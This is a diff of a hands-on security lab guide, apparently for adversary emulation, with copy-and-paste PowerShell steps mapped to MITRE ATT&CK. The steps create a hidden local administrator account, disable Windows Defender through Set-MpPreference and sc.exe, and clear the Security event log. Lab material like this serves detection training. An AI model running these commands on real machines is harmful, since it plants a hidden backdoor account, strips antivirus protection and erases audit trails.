@@ -69,32 +69,97 @@ For each of these labs, you will need your Powershell window open. You can use t
 
 w> All labs require you to be running as an administrator. 
 
-### 1. Disabling Security Tools - Powershell
 > *While most defensive evasion will be used alongside other techniques to hide them, an explicit defense evasion phase usually will happen where the attacker will disable security tools and logging.*
->
-> *The method we'll demonstrate today is to disable Windows Defender but often an attacker will use a script to detect and disable whatever AV is on the system. This action requires administrator privileges. This command may not work directly if tamper protection is enabled but there are methods an attacker can use to bypass tamper protection as well.*
 
-Use Powershell to perform a **Disable Security Tools** technique
+### 1. Creating a new user via net.exe
+*Attackers will often create users on the machine and attempt to escalate the privledges to manipulate the machine. A common technique is to use the net.exe process to silently create new users as well as escalate privleges to local administrator rights.*
+
+[ATT&CK T1136.001-Create Account-Local Account](https://attack.mitre.org/techniques/T1136/001/)
+- Copy and paste this command into the terminal:
+```Powershell
+Write-Host -ForegroundColor Cyan "Initiating Persistence...creating local account"
+Write-Host "Creating user 'notahacker' with admin rights..."
+$cmd = @"
+net user notahacker Password123! /add
+net localgroup administrators notahacker /add
+Start-Sleep -Milliseconds $n
+"@
+powershell.exe -nop -command $cmd 
+Write-Host -ForegroundColor Green "'notahacker' added to Administrators group successfully."
+
+*Verify user was created.*
+
+```Powershell
+net users
+```
+
+*If command ran correctly should return*
+
+```
+User accounts for \\[USER-WORKSTATION]
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest
+notahacker               [youraccount]                 WDAGUtilityAccount
+```
+
+### 2.Hiding the attacker from userlist - Defense Evasion
+*Attackers will also make attempts to conceal the account, the command below, will alter the registry keys to remove the user from the userlist screen on a login screen*
+
+- [ATT&CK T1564.002-Hide user from userlist](https://attack.mitre.org/techniques/T1564/002/)
+- Copy and paste this command into the terminal:
+```Powershell
+	$cmd = @"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v "notahacker"
+Start-Sleep -Milliseconds $n
+"@
+powershell.exe -nop -command $cmd
+Write-Host -ForegroundColor Green "'notahacker' removed from userlist."
+```
+
+### 3.Use Powershell to perform a **Disable Security Tools** technique
+*The method we'll demonstrate today is to disable Windows Defender, often an attacker will use a script to detect and disable whatever AV is on the system. This action requires administrator privileges. This command may not work directly if tamper protection is enabled but there are methods an attacker can use to bypass tamper protection as well.*
+
 - [ATT&CK T1089 - Defense Evasion - Disabling Security Tools](https://attack.mitre.org/techniques/T1089)
 - Copy and paste this command into the terminal:
-	```PowerShell
-	Write-Host -ForegroundColor Cyan "Initiating Defense Evasion - T1089 - Disabling Security Tools"
-	Write-Host "Disabling Defender..."
-	$cmd = "Set-MpPreference -DisableRealtimeMonitoring `$true; Start-Sleep -m $n"
-	powershell.exe -nop -command $cmd
-	```
+```PowerShell
+Write-Host -ForegroundColor Cyan "Initiating Defense Evasion - T1089 - Disabling Security Tools"
+Write-Host "Disabling Defender..."
+$cmd = @"
+Set-MpPreference -DisableRealtimeMonitoring $true
+Start-Sleep -Milliseconds $n
+"@
+powershell.exe -nop -command $cmd
+```
 
-### 2. Disabling Security Tools - Service Control Manager
+### 4. Disabling Security Tools - Service Control Manager
 > *If the above method does not work, attackers can also disable the antivirus service from the service control manager using sc.exe*
 
 Use the Service Control Manager (sc.exe) to perform a **Disable Security Tools** technique
 - [ATT&CK T1089 - Defense Evasion - Disabling Security Tools](https://attack.mitre.org/techniques/T1089)
 - Copy and paste this command into the terminal:
-	```PowerShell
-	Write-Host -ForegroundColor Cyan "Initiating Defense Evasion - T1089 - Disabling Security Tools"
-	Write-Host "Disabling Defender..."
-	& sc.exe config WinDefend start= disabled
-	* sc.exe stop WinDefend
-	```
+```PowerShell
+Write-Host -ForegroundColor Cyan "Initiating Defense Evasion - T1089 - Disabling Security Tools"
+Write-Host "Disabling Defender..."
+$cmd = @"
+sc.exe config WinDefend start= disabled
+sc.exe stop WinDefend
+Start-Sleep -Milliseconds $n
+"@
+powershell.exe -nop -command $cmd
+Write-Host -ForegroundColor Red "Windows Defender Disabled"
+```
 
-	
+### 5. Removing Evidence of Activity - wevtutil.exe clear logs
+*After completing certain tasks, or as part of a script, users wil conceal their tracks in an attempt to hide their activity*
+
+- [ATT&CK T1070.001 - Defense Evasion - Windows Event Logs Cleared](https://attack.mitre.org/techniques/T1070/001/)
+- Copy and paste this command into the terminal:
+```PowerShell
+Write-Host -ForegroundColor Cyan "Clearing Security Logs"
+$cmd = @"
+wevtutil.exe cl Security
+Start-Sleep -Milliseconds $n
+"@
+powershell.exe -nop -command $cmd
+Write-Host -ForegroundColor Cyan "Logs Cleared"
+```
